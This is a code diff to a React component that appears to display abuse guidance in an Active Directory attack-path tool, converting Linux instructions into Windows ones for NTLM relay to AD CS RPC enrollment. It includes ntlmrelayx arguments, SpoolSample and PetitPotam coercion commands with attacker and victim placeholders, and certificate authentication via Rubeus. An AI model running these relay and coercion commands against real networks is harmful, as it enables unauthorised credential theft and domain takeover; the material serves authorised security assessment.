@@ -17,24 +17,27 @@
 import { Link } from '@mui/material';
 import { Typography } from 'doodle-ui';
 import { FC } from 'react';
+import { EdgeInfoProps } from '../index';
 
-const LinuxAbuse: FC = () => {
+const WindowsAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
-            <Typography variant='body1'>1. Start the Relay Server</Typography>
+            <Typography variant='body1'>1. Start the Relay Server on Linux</Typography>
             <Typography variant='body2'>
-                The NTLM relay can be executed with{' '}
+                There is currently no publicly available Windows tool that supports relaying NTLM authentication to an
+                AD CS RPC enrollment endpoint. Start the relay server on a Linux host using{' '}
                 <Link
                     target='_blank'
                     rel='noopener noreferrer'
                     href='https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'>
                     ntlmrelayx.py
                 </Link>
-                . To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and
-                use the arguments:
+                . To relay to the enterprise CA via RPC and enroll a certificate, specify the RPC endpoint as the target
+                and use the following arguments:
             </Typography>
-            <Typography component={'pre'}>{'--adcs --template <TEMPLATE_NAME>'}</Typography>
-
+            <Typography component={'pre'}>
+                {'-t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support'}
+            </Typography>
             <Typography variant='body1'>2. Coerce the Target Computer</Typography>
             <Typography variant='body2'>
                 Several coercion methods are documented here:{' '}
@@ -47,16 +50,11 @@ const LinuxAbuse: FC = () => {
                 . Examples of tools include:
                 <ul style={{ paddingLeft: '1.5em' }}>
                     <li>
-                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/p0dalirius/Coercer'>
-                            Coercer.py
-                        </Link>
-                    </li>
-                    <li>
                         <Link
                             target='_blank'
                             rel='noopener noreferrer'
-                            href='https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'>
-                            printerbug.py
+                            href='https://github.com/leechristensen/SpoolSample'>
+                            SpoolSample
                         </Link>
                     </li>
                     <li>
@@ -70,11 +68,17 @@ const LinuxAbuse: FC = () => {
                 To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
                 Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
             </Typography>
-            <Typography component={'pre'}>
-                {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
+            <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
+            <Typography variant='body1'>3. Perform Certificate Authentication</Typography>
+            <Typography variant='body2'>
+                Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/GhostPack/Rubeus'>
+                    Rubeus
+                </Link>
+                .
             </Typography>
         </>
     );
 };
 
-export default LinuxAbuse;
+export default WindowsAbuse;
